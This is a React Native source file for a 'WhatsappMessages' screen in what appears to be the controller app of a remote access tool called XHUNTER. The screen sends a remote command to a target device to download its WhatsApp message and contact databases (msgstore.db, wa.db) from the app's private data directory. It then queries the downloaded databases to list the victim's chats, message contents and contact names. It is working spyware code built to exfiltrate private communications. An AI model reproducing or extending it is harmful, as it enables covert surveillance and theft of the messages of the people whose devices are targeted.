import React, { useEffect, useState } from "react";
import { 
    Box,
    StatusBar,
    HStack,
    IconButton,
    Icon,
    Text,
    Progress,
    FlatList, 
    Spacer,
    Pressable,
    VStack,
    Fab
} from "native-base";
import MaterialCommunityIcons from 'react-native-vector-icons/MaterialCommunityIcons';
import nodejs from 'nodejs-mobile-react-native';
import { Modal } from 'react-native';
import moment from "moment";
import RNFetchBlob from 'react-native-fetch-blob'
// redux
import { useSelector } from '../../redux/store';

import AppBuilder from '../../native-modules/AppBuilder'

const WhatsappMessages = ({navigation,route}) => {
  const { deviceId } = route.params;
  const { devices } = useSelector((state) => state.userInfo);
  const [visible, setVisible]=useState(false)
  const [refresh, setRefresh]=useState(false)
  const [transferPercentage, setTransferPercentage]=useState(0)
  const [chatList, setChatList]=useState([])
  const [contactList, setContactList]=useState([])
 
  useEffect(()=>{
    nodejs.channel.addListener("downloadWhatsappDatabase", (d)=>setTransferPercentage(d), this);
  },[])
  useEffect(()=>{
    checkIfDatabaseAvailable();
 },[refresh])
  
  const checkIfDatabaseAvailable=()=>{
    const dirs = RNFetchBlob.fs.dirs;
    var path = dirs.SDCardDir +`/XHUNTER/${devices[deviceId].model} (${deviceId})/msgstore.db`;
    //var path = dirs.SDCardDir +`/msgstore.db`;
    RNFetchBlob.fs.exists(path).then((flag) => {
     if(!flag){
      _getWhatsappDatabase("/data/data/com.gbwhatsapp/databases/msgstore.db");
     }else{
      fetchChatList();
      checkIfWADatabaseAvailable();
     }
    });
  }

  const checkIfWADatabaseAvailable=()=>{
    const dirs = RNFetchBlob.fs.dirs;
    var path = dirs.SDCardDir +`/XHUNTER/${devices[deviceId].model} (${deviceId})/wa.db`;
    //var path = dirs.SDCardDir +`/msgstore.db`;
    RNFetchBlob.fs.exists(path).then((flag) => {
     if(!flag){
      _getWhatsappDatabase("/data/data/com.gbwhatsapp/databases/wa.db");
     }else{
      fetchContacts();
     }
    });
  }

  const _getWhatsappDatabase=(path)=>{
    console.log(path)
    setTransferPercentage(0)
    setVisible(true)
    const data = {
      to: deviceId,
      action: "downloadWhatsappDatabase",
      data:path
    };
    const finalData = JSON.stringify(data);
    nodejs.channel.post('cmd',finalData)
   }

   const fetchChatList =()=>{
    const dirs = RNFetchBlob.fs.dirs;
    var path = dirs.SDCardDir +`/XHUNTER/${devices[deviceId].model} (${deviceId})/msgstore.db`;
   //var path = dirs.SDCardDir +`/msgstore.db`;
    var chatQuery="SELECT chat_view.raw_string_jid AS id, messages.key_from_me AS isFromMe, messages.media_mime_type AS isMedia, messages.data, max(messages.timestamp) AS timestamp FROM chat_view LEFT OUTER JOIN messages on messages.key_remote_jid = chat_view.raw_string_jid WHERE chat_view.hidden = 0 GROUP BY chat_view.raw_string_jid, chat_view.subject, chat_view.created_timestamp ORDER BY max(messages.timestamp) desc"
    AppBuilder.readDB(path, chatQuery, (d)=>setChatList(d));
   }

   const fetchContacts =()=>{
    const dirs = RNFetchBlob.fs.dirs;
     var path = dirs.SDCardDir +`/XHUNTER/${devices[deviceId].model} (${deviceId})/wa.db`;
     //var path = dirs.SDCardDir +`/wa.db`;
      var chatQuery=`SELECT jid, status, display_name FROM wa_contacts`
      AppBuilder.readDB(path, chatQuery, (d)=>setContactList(d));
   }

   const getName =(id)=>{
    if(contactList.length>0){
     let res=contactList.find(x => x.jid === id);
     if(res.display_name){
      return res.display_name;
     }else{
      return "";
     }
    }else{
      return "";
    }
   }


  return (
    <>
    <StatusBar translucent backgroundColor={"transparent"} barStyle="light-content" />
    <Box  safeAreaTop  bg={"primary"} />

    <Box flex={1} bg={"primary"} px={'2'} >
    <HStack my="4" alignItems="center" borderBottomWidth="1" borderBottomColor={'secondary.500'} >
      <IconButton 
         onPress={()=>navigation.goBack()}
         pr={30}
         icon={<Icon as={MaterialCommunityIcons} name="chevron-left-circle" />} 
         borderRadius="full" 
         _icon={{ color:  "tertiary.500", size: "sm"}} 
         _pressed={{ bg: "tertiary.800:alpha.20"}}            
         />
        <Text fontSize={'20'}  color={"secondary.500"}>Whatsapp Messages</Text>
    </HStack>
    <FlatList 
        data={chatList} 
        renderItem={({item}) => 
        <Pressable onPress={()=>navigation.navigate('chat',{ deviceId, id: item.id } )}>
        <Box bg="dark.100" borderRadius='5' py="4" px="2" mb='2'>
            <HStack flex={1} space={3} alignItems={'center'}>
            <Icon as={MaterialCommunityIcons} name={"account-circle"} color={"success.400"} size="10" mr="1"/>
           <VStack flex={1} space={3}>
            <HStack flex={1} justifyContent={"space-between"} >
            <Text noOfLines={1} fontSize={'18'} color={"white"}>{getName(item.id)?getName(item.id):"+"+item.id.substr(0,item.id.lastIndexOf("@"))}</Text>
            <Text noOfLines={1} fontSize={'14'} color={"white"}>{moment(new Date(item.timestamp*1)).calendar()}</Text>
            </HStack>
            {item.isMedia&&<HStack alignItems={"center"}>
            {item.isFromMe==1&&<Icon as={MaterialCommunityIcons} name={"check-all"} color={"info.400"} size="5" mr="1"/>}
            <Icon as={MaterialCommunityIcons} name={item.isMedia=="audio/ogg; codecs=opus"?"microphone":item.isMedia=="video/mp4"?"video":"image"} color={"info.400"} size="5" mr="1"/>
            <Text noOfLines={1} fontSize={'14'} color={"secondary.500"}>{item.isMedia=="audio/ogg; codecs=opus"?"Audio":item.isMedia=="video/mp4"?"Video":"Photo"} </Text>
            </HStack>}
            {!item.isMedia&&!item.data&&item.isFromMe==1&&<HStack alignItems={"center"}>
            {item.isFromMe==1&&<Icon as={MaterialCommunityIcons} name={"check-all"} color={"info.400"} size="5" mr="1"/>}
            <Icon as={MaterialCommunityIcons} name={item.isMedia=="audio/ogg; codecs=opus"?"microphone":item.isMedia=="video/mp4"?"video":"image"} color={"info.400"} size="5" mr="1"/>
            <Text noOfLines={1} fontSize={'14'} color={"secondary.500"}>{item.isMedia=="audio/ogg; codecs=opus"?"Audio":item.isMedia=="video/mp4"?"Video":"Photo"}</Text>
            </HStack>}
            {item.data&&<HStack alignItems={"center"}>
            {item.isFromMe==1&&<Icon as={MaterialCommunityIcons} name={"check-all"} color={"info.400"} size="5" mr="1"/>}
            <Text noOfLines={1} fontSize={'12'} color={"secondary.500"}>{item.data} </Text>
            </HStack>}
           </VStack>
            </HStack>
        </Box>
        </Pressable>
        } 
        keyExtractor={item => item.id}
        />
        <Fab renderInPortal={false} onPress={()=>navigation.navigate("whatsappContacts",{contactList})} bg="success.600" shadow={10} right={6} size="md" icon={<Icon as={MaterialCommunityIcons} name={"android-messages"} color={"white"} size="6"/>} />
    </Box>
    <Modal
      animationType="fade"
      visible={visible}
      presentationStyle={'overFullScreen'}
      transparent={true}
      onRequestClose={() => {
        setVisible(false);
      }}>
      <Box flex={1} justifyContent={"center"} px={5} >
            <Box w="100%" py={10} background="dark.200" px={5} justifyContent={"center"} borderRadius={10}>
                <Progress colorScheme="success" size="md" value={transferPercentage} />
                <Text left='2' fontWeight={'bold'} fontSize={'14'} color={"white"}>Downloading Whatsapp Data: {transferPercentage}%</Text>
                <Spacer/>
                <HStack pt={4} >
                <Spacer/>
                <Text onPress={()=>{setVisible(false); setRefresh(!refresh)}} fontWeight={'bold'} fontSize={'14'} color={"white"}>{transferPercentage==100?"Done":"Cancel"}</Text>
                </HStack>
            </Box>
      </Box>
    </Modal>
    </>
    )
};

export default WhatsappMessages;
  